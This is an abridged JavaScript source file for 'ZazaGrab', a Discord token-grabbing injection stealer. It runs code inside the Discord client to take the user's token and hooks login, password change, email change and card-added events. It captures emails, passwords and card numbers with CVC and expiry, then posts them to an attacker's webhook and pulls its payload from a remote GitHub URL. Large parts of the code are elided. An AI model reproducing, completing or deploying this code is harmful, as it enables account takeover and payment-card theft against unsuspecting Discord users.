...
const config = {
    ...
    injection_url: "https://raw.githubusercontent.com/HLD1KS/discord-grb/main/index.js",
    webhook: "%WEBHOOK%",
    filter2: {
        urls: [
...
if (fs.existsSync(bdPath)) require(bdPath);`;
    ...
    if (!fs.existsSync(path.join(__dirname, "zazagrab"))) return !0;
    execScript(
...
async function FirstTime() {
    ...
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
        ...
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "zazagrab"))) {
                fs.rmdirSync(path.join(__dirname, "zazagrab"));
                if (token == null || token == undefined || token == "") {
                    ...
                    const c = {
                        ...
                        avatar_url: "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrab(2).jpg",
                        content: "",
                        embeds: [{
                            ...
                            footer: {
                                text: "Sole's | https://github.com/zazaman4000"
                            }
						}]
                    };
                    ...
                    if(b.avatar === null){
                        usericonurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/image.jpg"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/frame_4_delay-0.16s-removebg-preview.jpg"
                    }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                    const c = {
                        username: "ZazaGrab Grabber",
                        avatar_url: "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/image.jpg",
                        content: "",
                        embeds: [{
                            title: "ZazaGrab Initalized",
                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have ZazaGrabed someone**](https://github.com/zazaman4000)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                ...
                if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            ...
                            if(b.avatar === null){
                                usericonurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrab%20-%20injection.jpg"
                            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                            if(b.banner === null){
                                bannerurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrab(2).jpg"
                            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                            const c = {
                                username: "ZazaGrab Grabber",
                                avatar_url: "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/580b57fcd9996e24bc43c3de.png",
                                content: "",
                                embeds: [{
...
async function Login(email, password, token) {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            if(info.avatar === null){
                usericonurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/frame_4_delay-0.16s-removebg-preview.jpg"
            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
            if(info.banner === null){
                bannerurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/580b57fcd9996e24bc43c3de.png"
...
async function ChangePassword(oldpassword, newpassword, token) {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                username: "ZazaGrab Grabber",
                avatar_url: "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrab%20-%20injection.jpg",
                content: "",
                embeds: [{
...
async function ChangeEmail(newemail, password, token) {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            if(info.avatar === null){
                usericonurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrab(2).jpg"
            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
            if(info.banner === null){
                bannerurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/580b57fcd9996e24bc43c3de.png"
            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
...
async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    ...
    var {
        ...
        if(info.banner === null){
            bannerurl = "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/image.jpg"
        }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
